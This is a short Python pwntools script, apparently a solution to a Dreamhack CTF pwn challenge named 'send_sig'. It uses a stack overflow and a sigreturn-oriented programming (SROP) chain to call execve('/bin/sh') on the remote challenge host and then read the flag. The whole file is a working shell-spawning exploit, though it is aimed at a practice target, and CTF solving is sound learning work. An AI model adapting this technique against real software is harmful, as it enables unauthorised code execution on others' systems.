#!/usr/bin/env python3
from pwn import *

PORT = 17576
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./send_sig', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

bin_sh = 0x402000
pop_rax = 0x004010ae
syscall = 0x004010b0

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

pl = flat(
	b'A'*0x10,
	pop_rax, 0x0f,
	syscall,
	bytes(frame)
	)

p.send(pl)
p.sendline("cat flag.txt")

p.interactive()